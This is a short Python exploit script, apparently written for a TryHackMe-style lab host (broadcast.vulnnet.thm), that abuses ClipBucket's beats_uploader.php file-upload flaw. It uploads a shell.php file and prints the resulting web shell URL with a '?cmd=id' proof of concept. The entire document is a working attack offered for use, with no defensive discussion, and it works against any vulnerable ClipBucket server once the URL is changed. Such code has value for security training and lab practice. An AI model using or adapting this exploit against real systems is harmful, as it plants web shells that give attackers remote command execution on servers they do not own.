#!/usr/bin/python3 

# Author: sha16
# References: 
#       - https://sec-consult.com/vulnerability-lab/advisory/os-command-injection-arbitrary-file-upload-sql-injection-in-clipbucket/
#       - https://www.exploit-db.com/exploits/44346
#       - https://github.com/abeljm/Exploit-ClipBucket-4-File-Upload

import requests, json, sys
from time import sleep

# Function to upload a malicious file! 
def upload_file():
    vulnerable_url = url + '/actions/beats_uploader.php'
    
    headers = {
        'Authorization': 'Basic [USERNAME:PASSWORD(base64)]',
    }

    with open('shell.php', 'rb') as shell:
        data = {
            'plupload':1,
            'name':'shell.php'
        }

        print('~ Uploading malicious file...!\n')
        sleep(0.5)

        try:    
            response = requests.post(vulnerable_url, files={'file':shell}, data=data, headers=headers, verify=False)
            return json.loads(response.text)
        except:
            print('\n[!] Oh no! Something went wrong:o')
            sys.exit(2)
            
# Main Function
if __name__ == '__main__':
    url = 'http://broadcast.vulnnet.thm'
    response = upload_file()

    if response['success'] == 'yes':
        webshell_location = url + '/actions/' + response['file_directory'] + '/' + response['file_name'] + '.' + response['extension'] 
        print('[+] WebShell Location: {}'.format(webshell_location))
        print('[?] PoC: {}?cmd=id'.format(webshell_location))
        print('\n~ Happy Hacking!')
    else:
        print('[!] Something went wrong!:(')
